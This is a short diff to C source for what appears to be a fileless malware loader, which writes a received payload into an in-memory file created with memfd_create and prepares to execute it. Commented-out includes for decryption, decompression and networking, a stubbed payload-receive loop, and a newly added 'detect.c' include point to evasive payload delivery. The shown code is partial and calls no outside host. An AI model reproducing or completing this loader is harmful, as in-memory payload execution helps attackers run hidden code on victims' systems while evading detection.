@@ -2,12 +2,13 @@
 #include <stdio.h>
 #include <unistd.h>
 #include <sys/mman.h>
+#include "detect.c"
 
 //#include <decompress.h>
 //#include <decrypt.h>
 //#include <execute.h>
 //#include <networking.h>
-// blablabla
+
 /*
     Get size in bytes of given file
 */
@@ -27,11 +28,10 @@ int main(int argc, char **argv){
     int size; // to hold file size, remove in final deliverable
     int payload_fd; // in memory file descriptor
     int write_return_size;
-    const char * payload_argv[] = {"test_ELF", "hellohello", NULL}; // argv for payload
+    const char * payload_argv[] = {"test_ELF", "testing", NULL}; // argv for payload
     const char * payload_envp[] = {NULL}; // envp for payload
     
 /*
-
     while(receive(payload) != 0){
         puts("BAD SHIT YO");
         sleep(1);
@@ -50,7 +50,7 @@ int main(int argc, char **argv){
 
     // TODO: Recreate payload_fd if invalid (has returned STDIN, STDOUT, and STDERR before)
     payload_fd = memfd_create("payload", 0); // create memory file descriptor for execution
-    if (payload_fd <= 2){ 
+    if (payload_fd <= 2){
         printf("memfd_create() failed. File descriptor created: %d\n", payload_fd);
         return -1;
     }
